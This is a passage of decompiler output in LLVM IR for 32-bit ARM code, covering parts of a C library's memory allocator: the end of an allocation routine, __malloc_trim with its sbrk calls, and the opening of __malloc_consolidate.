dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16eb8
  %v1_16ec0 = load i32, i32* @r5, align 4
  %v2_16ec0 = add i32 %v1_16ec0, %v0_16eb8
  %v0_16ec4 = load i32, i32* @r7, align 4
  %v2_16ec4 = sub i32 %v2_16ec0, %v0_16ec4
  %v1_16ec8 = or i32 %v2_16ec4, 1
  %v2_16ecc = add i32 %v0_16ec4, 4
  %v3_16ecc = inttoptr i32 %v2_16ecc to i32*
  store i32 %v1_16ec8, i32* %v3_16ecc, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r1.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_16ed8 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16ed8, i32* @r6, align 4
  %v1_16edc = add i32 %v4_16ed8, 872
  %v2_16edc = inttoptr i32 %v1_16edc to i32*
  %v3_16edc = load i32, i32* %v2_16edc, align 4
  %v0_16ee0 = load i32, i32* @r8, align 4
  %v2_16ee0 = icmp eq i32 %v0_16ee0, 0
  %v0_16ee4 = load i32, i32* @r5, align 4
  %v2_16ee4 = add i32 %v0_16ee4, %v3_16edc
  store i32 %v2_16ee4, i32* %r3.global-to-local, align 4
  store i32 %v2_16ee4, i32* %v2_16edc, align 4
  %v0_16eec = load i32, i32* @r7, align 4
  %v1_16eec = load i32, i32* @r6, align 4
  %v2_16eec = add i32 %v1_16eec, 44
  %v3_16eec = inttoptr i32 %v2_16eec to i32*
  store i32 %v0_16eec, i32* %v3_16eec, align 4
  br i1 %v2_16ee0, label %dec_label_pc_16f3c, label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16ec0
  %v0_16ef8 = load i32, i32* @r8, align 4
  %v1_16ef8 = add i32 %v0_16ef8, -12
  %v1_16efc = and i32 %v1_16ef8, -8
  store i32 %v3_16cc4, i32* %ip.global-to-local, align 4
  %v2_16f04 = add i32 %v1_16efc, %v3_16cc4
  store i32 %v2_16f04, i32* %r1.global-to-local, align 4
  %v2_16f08 = icmp ugt i32 %v1_16efc, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_16f10 = or i32 %v1_16efc, 1
  store i32 %v1_16f10, i32* %r3.global-to-local, align 4
  store i32 %v1_16f10, i32* %v2_16cd0, align 4
  %v0_16f18 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f18 = load i32, i32* %r1.global-to-local, align 4
  %v2_16f18 = add i32 %v1_16f18, 8
  %v3_16f18 = inttoptr i32 %v2_16f18 to i32*
  store i32 %v0_16f18, i32* %v3_16f18, align 4
  %v0_16f1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16f1c = load i32, i32* %r1.global-to-local, align 4
  %v2_16f1c = add i32 %v1_16f1c, 4
  %v3_16f1c = inttoptr i32 %v2_16f1c to i32*
  store i32 %v0_16f1c, i32* %v3_16f1c, align 4
  br i1 %v2_16f08, label %dec_label_pc_16f24, label %dec_label_pc_16f3c

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16ef4
  %v0_16f24 = load i32, i32* @r6, align 4
  %v1_16f24 = add i32 %v0_16f24, 836
  %v2_16f24 = inttoptr i32 %v1_16f24 to i32*
  %v3_16f24 = load i32, i32* %v2_16f24, align 4
  store i32 %v3_16f24, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_16f2c = load i32, i32* %ip.global-to-local, align 4
  %v1_16f2c = add i32 %v0_16f2c, 8
  store i32 %v1_16f2c, i32* @r0, align 4
  store i32 -1, i32* %v2_16f24, align 4
  %v0_16f34 = call i32 @free()
  store i32 %v0_16f34, i32* %r0.global-to-local, align 4
  %v0_16f38 = load i32, i32* @r4, align 4
  %v1_16f38 = load i32, i32* @r6, align 4
  %v2_16f38 = add i32 %v1_16f38, 836
  %v3_16f38 = inttoptr i32 %v2_16f38 to i32*
  store i32 %v0_16f38, i32* %v3_16f38, align 4
  br label %dec_label_pc_16f3c

dec_label_pc_16f3c:                               ; preds = %.thread35, %dec_label_pc_16ef4, %dec_label_pc_16ec0, %dec_label_pc_16eb8, %dec_label_pc_16f24
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* %r0.global-to-local, align 4
  %v4_16f44 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 36) to i32*), align 4
  store i32 %v4_16f44, i32* %lr.global-to-local, align 4
  %v1_16f48 = add i32 %v4_16f44, 872
  store i32 %v1_16f48, i32* %r1.global-to-local, align 4
  %v1_16f4c = inttoptr i32 %v1_16f48 to i32*
  %v2_16f4c = load i32, i32* %v1_16f4c, align 4
  store i32 %v2_16f4c, i32* %r1.global-to-local, align 4
  %v3_16f4c = add i32 %v4_16f44, 876
  %v4_16f4c = inttoptr i32 %v3_16f4c to i32*
  %v5_16f4c = load i32, i32* %v4_16f4c, align 4
  store i32 %v5_16f4c, i32* %r3.global-to-local, align 4
  %v1_16f54 = add i32 %v4_16f44, 868
  %v2_16f54 = inttoptr i32 %v1_16f54 to i32*
  %v3_16f54 = load i32, i32* %v2_16f54, align 4
  store i32 %v3_16f54, i32* %r3.global-to-local, align 4
  %v1_16f58 = add i32 %v4_16f44, 884
  %v2_16f58 = inttoptr i32 %v1_16f58 to i32*
  %v3_16f58 = load i32, i32* %v2_16f58, align 4
  store i32 %v3_16f58, i32* %r2.global-to-local, align 4
  %v2_16f5c = add i32 %v3_16f54, %v2_16f4c
  store i32 %v2_16f5c, i32* %r3.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_16f4c, %v5_16f4c
  br i1 %tmp216, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_16f3c
  store i32 %v2_16f4c, i32* %v4_16f4c, align 4
  %v0_16f64.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_16f64.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_16f3c, %bb166
  %v1_16f64 = phi i32 [ %v3_16f58, %dec_label_pc_16f3c ], [ %v1_16f64.pre, %bb166 ]
  %v4_16f68 = phi i32 [ %v2_16f5c, %dec_label_pc_16f3c ], [ %v0_16f64.pre, %bb166 ]
  %tmp217 = icmp ugt i32 %v4_16f68, %v1_16f64
  br i1 %tmp217, label %bb168, label %bb169

bb168:                                            ; preds = %bb167
  %v5_16f68 = load i32, i32* %lr.global-to-local, align 4
  %v6_16f68 = add i32 %v5_16f68, 884
  %v7_16f68 = inttoptr i32 %v6_16f68 to i32*
  store i32 %v4_16f68, i32* %v7_16f68, align 4
  br label %bb169

bb169:                                            ; preds = %bb167, %bb168
  %v0_16f6c = load i32, i32* %lr.global-to-local, align 4
  %v1_16f6c = add i32 %v0_16f6c, 44
  %v2_16f6c = inttoptr i32 %v1_16f6c to i32*
  %v3_16f6c = load i32, i32* %v2_16f6c, align 4
  store i32 %v3_16f6c, i32* %ip.global-to-local, align 4
  %v1_16f70 = add i32 %v3_16f6c, 4
  %v2_16f70 = inttoptr i32 %v1_16f70 to i32*
  %v3_16f70 = load i32, i32* %v2_16f70, align 4
  store i32 %v1_16b84, i32* %r1.global-to-local, align 4
  %v1_16f78 = and i32 %v3_16f70, -4
  store i32 %v1_16f78, i32* %r3.global-to-local, align 4
  %v3_16f7c = icmp ult i32 %v1_16f78, %v1_16b84
  br i1 %v3_16f7c, label %dec_label_pc_16fa8, label %dec_label_pc_16f84

dec_label_pc_16f84:                               ; preds = %bb169
  %v0_16f84 = load i32, i32* @sl, align 4
  %v2_16f84 = sub i32 %v1_16f78, %v0_16f84
  %v2_16f88 = add i32 %v0_16f84, %v3_16f6c
  store i32 %v2_16f88, i32* %r1.global-to-local, align 4
  %v1_16f8c = or i32 %v2_16f84, 1
  store i32 %v1_16f8c, i32* %r3.global-to-local, align 4
  %v1_16f90 = or i32 %v0_16f84, 1
  store i32 %v1_16f90, i32* %r2.global-to-local, align 4
  %v1_16f94 = add i32 %v3_16f6c, 8
  store i32 %v1_16f94, i32* %r0.global-to-local, align 4
  store i32 %v1_16f90, i32* %v2_16f70, align 4
  %v0_16f9c = load i32, i32* %r1.global-to-local, align 4
  %v1_16f9c = load i32, i32* %lr.global-to-local, align 4
  %v2_16f9c = add i32 %v1_16f9c, 44
  %v3_16f9c = inttoptr i32 %v2_16f9c to i32*
  store i32 %v0_16f9c, i32* %v3_16f9c, align 4
  %v0_16fa0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16fa0 = load i32, i32* %r1.global-to-local, align 4
  %v2_16fa0 = add i32 %v1_16fa0, 4
  %v3_16fa0 = inttoptr i32 %v2_16fa0 to i32*
  store i32 %v0_16fa0, i32* %v3_16fa0, align 4
  br label %dec_label_pc_16fb8

dec_label_pc_16fa8:                               ; preds = %bb158, %bb169, %dec_label_pc_16d84
  %v0_16fa8 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16fb0 = inttoptr i32 %v0_16fa8 to i32*
  store i32 12, i32* %v2_16fb0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fb8

dec_label_pc_16fb8:                               ; preds = %bb152, %bb151, %dec_label_pc_16f84, %dec_label_pc_16bcc, %dec_label_pc_16fa8
  %v0_16fb8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fb8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16fbc

dec_label_pc_16fbc:                               ; preds = %.thread2, %dec_label_pc_16b98, %.thread122, %dec_label_pc_16a08, %dec_label_pc_169fc, %dec_label_pc_16864, %dec_label_pc_167e8, %dec_label_pc_16fb8
  store i32 %v2_16710, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* @r3, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32* @r2, align 4
  %v4_16fcc = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 28) to i32*), align 4
  store i32 %v4_16fcc, i32* @ip, align 4
  store i32 94168, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16fcc)
  br label %dec_label_pc_16fd8

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16748, %dec_label_pc_16fbc
  %v0_16fd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16fd8, i32* %r0.global-to-local, align 4
  store i32 %v3_166e4, i32* @r4, align 4
  store i32 %v6_166e4, i32* @r5, align 4
  store i32 %v9_166e4, i32* @r6, align 4
  store i32 %v12_166e4, i32* @r7, align 4
  store i32 %v15_166e4, i32* @r8, align 4
  store i32 %v18_166e4, i32* @sb, align 4
  store i32 %v21_166e4, i32* @sl, align 4
  store i32 %v24_166e4, i32* @fp, align 4
  store i32 %v27_166e4, i32* @lr, align 4
  ret i32 %v0_16fd8

; uselistorder directives
  uselistorder i32 %v0_16f84, { 1, 0, 2 }
  uselistorder i32 %v3_16f6c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16f68, { 1, 0 }
  uselistorder i32 %v2_16f4c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16f44, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_16efc, { 1, 2, 0 }
  uselistorder i32 %v0_16ec4, { 1, 0 }
  uselistorder i32 %v0_16eb8, { 1, 0 }
  uselistorder i32 %v2_16ea8, { 1, 0 }
  uselistorder i32 %v2_16e38, { 2, 1, 0 }
  uselistorder i32 %v2_16e20, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16e18, { 1, 0, 2 }
  uselistorder i32 %v1_16e14, { 2, 1, 0 }
  uselistorder i32 %v0_16e14, { 3, 1, 2, 0 }
  uselistorder i32 %v1_16df8, { 1, 0 }
  uselistorder i32 %v2_16dd0, { 1, 0 }
  uselistorder i32 %v3_16dc4, { 1, 0, 2 }
  uselistorder i32 %v2_16da4, { 1, 0, 2 }
  uselistorder i32* %v2_16d9c, { 1, 0, 2 }
  uselistorder i32 %v0_16d84, { 1, 0 }
  uselistorder i32 %v6_16d60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_16d4c, { 2, 1, 0 }
  uselistorder i32 %v0_16d34, { 1, 0 }
  uselistorder i32 %v2_16cf0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16cec, { 1, 0 }
  uselistorder i32 %v3_16cc4, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_16ca4, { 1, 0, 2 }
  uselistorder i32 %v2_16c8c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16c34, { 2, 1, 0 }
  uselistorder i32 %v6_16c28, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_16c04, { 2, 1, 0, 3 }
  uselistorder i32 %v3_16bc4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16b84, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_16b7c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16b78, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_16b64, { 1, 0 }
  uselistorder i32 %v7_16b24, { 1, 0 }
  uselistorder i32 %v4_16b24, { 1, 0 }
  uselistorder i32 %v0_16af4, { 1, 0 }
  uselistorder i32 %v2_16ac8, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_16ac455, { 1, 0 }
  uselistorder i32 %v1_16a90, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_16a78., { 1, 2, 0 }
  uselistorder i32 %v0_16a80, { 0, 1, 3, 2 }
  uselistorder i32 %v1_16a80, { 1, 0 }
  uselistorder i32 %v3_16a60, { 1, 0 }
  uselistorder i32 %v4_16a5c, { 1, 0, 2 }
  uselistorder i32 %v1_169cc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16a24, { 1, 0 }
  uselistorder i32 %v1_16a08, { 1, 0 }
  uselistorder i32 %v1_168a8, { 1, 0 }
  uselistorder i32 %v0_169e8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_169b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16a44.pre, { 1, 2, 0 }
  uselistorder i32 %v0_1698c, { 2, 1, 0 }
  uselistorder i32 %v3_16980, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_168a0, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_16948, { 1, 0 }
  uselistorder i32 %v3_1693c, { 1, 0 }
  uselistorder i32 %v0_16948, { 1, 0 }
  uselistorder i32 %v3_16920, { 0, 2, 3, 1 }
  uselistorder i32 %v2_16910, { 1, 0, 2 }
  uselistorder i32 %v3_168c8, { 2, 1, 0 }
  uselistorder i32 %v0_168b8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16888, { 1, 0 }
  uselistorder i32 %v1_1683c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16838, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_167dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_167d0, { 1, 0 }
  uselistorder i32 %v3_167a0, { 1, 0 }
  uselistorder i32 %v0_16794, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_16774, { 0, 2, 1, 3 }
  uselistorder i1 %v7_16768, { 1, 0 }
  uselistorder i32 %v0_16740, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 49, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_16fd8, { 1, 0 }
  uselistorder label %dec_label_pc_16fbc, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_16fb8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16fa8, { 1, 2, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %dec_label_pc_16f3c, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16eb8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16eb0, { 1, 0 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread41, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_16d84, { 1, 0 }
  uselistorder label %.thread33, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %dec_label_pc_16cb8, { 2, 0, 3, 1 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %bb149, { 1, 0 }
  uselistorder label %.thread28, { 1, 0 }
  uselistorder label %dec_label_pc_16b70, { 0, 2, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %dec_label_pc_16ac4, { 1, 0 }
  uselistorder label %dec_label_pc_16acc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16a90, { 1, 0 }
  uselistorder label %dec_label_pc_16a44, { 1, 0 }
  uselistorder label %dec_label_pc_169d8, { 1, 0 }
  uselistorder label %dec_label_pc_169d4, { 1, 0 }
  uselistorder label %dec_label_pc_16980, { 1, 0 }
  uselistorder label %dec_label_pc_1696c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16934, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16920, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
  uselistorder label %bb139, { 1, 0 }
}

define i32 @function_16fec(i32 %arg1) local_unnamed_addr {
dec_label_pc_16fec:
  %v0_16fec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16fec, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16fec
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16fec, %bb
  %v10_17000 = phi i32 [ %arg1, %dec_label_pc_16fec ], [ 0, %bb ]
  ret i32 %v10_17000

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_17004 = add i32 %arg2, 44
  %v2_17004 = inttoptr i32 %v1_17004 to i32*
  %v3_17004 = load i32, i32* %v2_17004, align 4
  %v12_17008 = load i32, i32* @r7, align 4
  %v1_1700c = add i32 %v3_17004, 4
  %v2_1700c = inttoptr i32 %v1_1700c to i32*
  %v3_1700c = load i32, i32* %v2_1700c, align 4
  %v1_17010 = add i32 %arg2, 860
  %v2_17010 = inttoptr i32 %v1_17010 to i32*
  %v3_17010 = load i32, i32* %v2_17010, align 4
  store i32 %v3_17010, i32* @r4, align 4
  %v1_17014 = and i32 %v3_1700c, -4
  store i32 %v1_17014, i32* @r6, align 4
  %v1_17018 = add i32 %v1_17014, -17
  %v2_1701c = add i32 %v1_17018, %v3_17010
  store i32 %arg2, i32* @r5, align 4
  %v2_17028 = sub i32 %v2_1701c, %arg1
  store i32 %v3_17010, i32* %r1.global-to-local, align 4
  %v2_17030 = udiv i32 %v2_17028, %v3_17010
  %v1_17034 = add i32 %v2_17030, -1
  store i32 %v1_17034, i32* %r0.global-to-local, align 4
  %v2_17038 = mul i32 %v1_17034, %v3_17010
  store i32 %v2_17038, i32* @r7, align 4
  %v2_1703c = icmp eq i32 %v2_17038, 0
  store i1 %v2_1703c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_17038, 1
  br i1 %tmp8, label %dec_label_pc_170a4, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17048 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_17048, i32* %r0.global-to-local, align 4
  %v0_1704c = load i32, i32* @r5, align 4
  %v1_1704c = add i32 %v0_1704c, 44
  %v2_1704c = inttoptr i32 %v1_1704c to i32*
  %v3_1704c = load i32, i32* %v2_1704c, align 4
  %v0_17050 = load i32, i32* @r6, align 4
  %v2_17050 = add i32 %v0_17050, %v3_1704c
  %v9_17054 = icmp eq i32 %v1_17048, %v2_17050
  store i1 %v9_17054, i1* @cpsr_z, align 1
  store i32 %v1_17048, i32* @r4, align 4
  br i1 %v9_17054, label %dec_label_pc_17060, label %dec_label_pc_170a4

dec_label_pc_17060:                               ; preds = %dec_label_pc_17044
  %v0_17060 = load i32, i32* @r7, align 4
  %v1_17060 = sub i32 0, %v0_17060
  store i32 %v1_17060, i32* %r0.global-to-local, align 4
  %v1_17064 = call i32 @__GI_sbrk(i32 %v1_17060)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1706c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1706c, i32* %r0.global-to-local, align 4
  %v7_17070 = icmp eq i32 %v1_1706c, -1
  store i1 %v7_17070, i1* @cpsr_z, align 1
  br i1 %v7_17070, label %dec_label_pc_170a4, label %dec_label_pc_17078

dec_label_pc_17078:                               ; preds = %dec_label_pc_17060
  %v0_17078 = load i32, i32* @r4, align 4
  %v2_17078 = sub i32 %v0_17078, %v1_1706c
  store i32 %v2_17078, i32* %r0.global-to-local, align 4
  %v9_17078 = icmp eq i32 %v0_17078, %v1_1706c
  store i1 %v9_17078, i1* @cpsr_z, align 1
  br i1 %v9_17078, label %dec_label_pc_170a4, label %dec_label_pc_17080

dec_label_pc_17080:                               ; preds = %dec_label_pc_17078
  %v0_17080 = load i32, i32* @r5, align 4
  %v1_17080 = add i32 %v0_17080, 872
  %v2_17080 = inttoptr i32 %v1_17080 to i32*
  %v3_17080 = load i32, i32* %v2_17080, align 4
  %v1_17084 = load i32, i32* @r6, align 4
  %v2_17084 = sub i32 %v1_17084, %v2_17078
  %v1_17088 = add i32 %v0_17080, 44
  %v2_17088 = inttoptr i32 %v1_17088 to i32*
  %v3_17088 = load i32, i32* %v2_17088, align 4
  store i32 %v3_17088, i32* %r1.global-to-local, align 4
  %v2_1708c = sub i32 %v3_17080, %v2_17078
  %v1_17090 = or i32 %v2_17084, 1
  store i32 %v1_17090, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1708c, i32* %v2_17080, align 4
  %v0_1709c = load i32, i32* @r2, align 4
  %v1_1709c = load i32, i32* %r1.global-to-local, align 4
  %v2_1709c = add i32 %v1_1709c, 4
  %v3_1709c = inttoptr i32 %v2_1709c to i32*
  store i32 %v0_1709c, i32* %v3_1709c, align 4
  %v1_170b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_170a8

dec_label_pc_170a4:                               ; preds = %dec_label_pc_17044, %dec_label_pc_17078, %dec_label_pc_17060, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_170a8

dec_label_pc_170a8:                               ; preds = %dec_label_pc_17080, %dec_label_pc_170a4
  %v1_170b0 = phi i32 [ %v1_170b0.pre, %dec_label_pc_17080 ], [ 0, %dec_label_pc_170a4 ]
  store i32 %v12_17008, i32* @r7, align 4
  ret i32 %v1_170b0

; uselistorder directives
  uselistorder i1 %v7_17070, { 1, 0 }
  uselistorder i32 %v1_1706c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_17010, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_170a8, { 1, 0 }
  uselistorder label %dec_label_pc_170a4, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_170b4 = load i32, i32* @r4, align 4
  store i32 %v3_170b4, i32* %stack_var_-36, align 4
  %v0_170b8 = load i32, i32* @r0, align 4
  %v1_170b8 = inttoptr i32 %v0_170b8 to i32*
  %v2_170b8 = load i32, i32* %v1_170b8, align 4
  store i32 %v2_170b8, i32* %r3.global-to-local, align 4
  %v2_170bc = icmp eq i32 %v2_170b8, 0
  store i32 %v0_170b8, i32* @r4, align 4
  br i1 %v2_170bc, label %dec_label_pc_171f4.preheader, label %dec_label_pc_170d0

dec_label_pc_171f4.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_171fc25 = add i32 %v0_170b8, 52
  store i32 %v1_171fc25, i32* %r3.global-to-local, align 4
  %v2_1720426 = add i32 %v0_170b8, 60
  %v3_1720427 = inttoptr i32 %v2_1720426 to i32*
  store i32 %v1_171fc25, i32* %v3_1720427, align 4
  %v0_1720828 = load i32, i32* %r3.global-to-local, align 4
  %v2_1720829 = add i32 %v0_1720828, 12
  %v3_1720830 = inttoptr i32 %v2_1720829 to i32*
  store i32 %v0_1720828, i32* %v3_1720830, align 4
  br label %dec_label_pc_171f4.dec_label_pc_171f4_crit_edge

dec_label_pc_170d0:                               ; preds = %entry
  %v1_170d0 = and i32 %v2_170b8, -3
  %v3_170d4 = udiv i32 %v2_170b8, 8
  store i32 %v3_170d4, i32* %r2.global-to-local, align 4
  store i32 %v1_170d0, i32* %v1_170b8, align 4
  %v0_170dc = load i32, i32* @r0, align 4
  %v1_170dc = add i32 %v0_170dc, -4
  store i32 %v1_170dc, i32* %r3.global-to-local, align 4
  %v1_170e0 = load i32, i32* %r2.global-to-local, align 4
  %v4_170e0 = mul i32 %v1_170e0, 4
  %v5_170e0 = add i32 %v4_170e0, %v1_170dc
  store i32 %v5_170e0, i32* %sb.global-to-local, align 4
  %v1_170e4 = add i32 %v0_170dc, 52
  store i32 %v1_170e4, i32* %r7.global-to-local, align 4
  %v1_170e8 = add i32 %v0_170dc, 4
  store i32 %v1_170e8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_170f0

dec_label_pc_170f0:                               ; preds = %dec_label_pc_171ec, %dec_label_pc_170d0
  %v1_171e410 = phi i32 [ %v1_171e4, %dec_label_pc_171ec ], [ %v5_170e0, %dec_label_pc_170d0 ]
